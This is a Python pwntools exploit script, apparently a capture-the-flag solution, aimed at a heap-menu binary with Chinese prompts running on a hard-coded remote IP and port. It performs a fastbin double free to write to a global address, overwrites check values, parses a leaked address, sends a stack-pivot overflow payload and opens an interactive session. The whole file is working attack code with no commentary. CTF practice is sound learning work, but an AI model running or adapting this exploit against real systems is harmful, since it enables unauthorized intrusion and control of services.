#!/usr/bin/python3
# -*- coding: UTF-8 -*-
from pwn import *
context(log_level='debug',os='linux',arch='amd64')

#p = process('./1')
p =remote("59.110.164.72",10021)
elf=ELF('./1')


def menu(choice):
    p.sendlineafter("请选择：",str(choice))


def add(idx,size):
    menu(1)
    p.sendlineafter("请输入序号：",str(idx))
    p.sendlineafter("请输入大小：",str(size))

def free(idx):
    menu(2)
    p.sendlineafter("请输入序号：",str(idx))

def show(idx):
    menu(3)
    p.sendlineafter("请输入序号：",str(idx))

def edit(idx,con):
   menu(4)
   p.sendlineafter("请输入序号：",str(idx))
   p.sendlineafter("请输入编辑内容：",con)


add(0,0x68)
add(1,0x68)
add(2,0x68)
add(3,0x68)

free(1)
free(0)
free(1)
add(4,0x68)
edit(4,p64(0x6021d8))
add(5,0x68)
add(6,0x68)
add(7,0x68)
edit(7,p64(0x15cc15cc)+p64(0x400cd8)+p64(0)*6+p64(0xcc51cc51))

menu(5)
p.recvuntil(b"congratulations! Give you a reward: ")
buf_addr = int(p.recvline(),16)
# buf_addr = (buf_addr &0xffff)
print (hex(buf_addr))
tmp = (buf_addr &0xffff)+0xf0
low = (tmp)&0xff
print (hex(low))
high = (tmp)>>8
print (hex(high))
# gdb.attach(p,"b *0x400c3f")
# pause()

payload1 = b"a"*0x20+p8(low)+p8(high)+b"a"*6+b"b"*0xc8+\
    p64(0x6021e8+0x10)+p64(0x4008f7)
p.sendlineafter(b"want to say:\n",payload1)

p.interactive()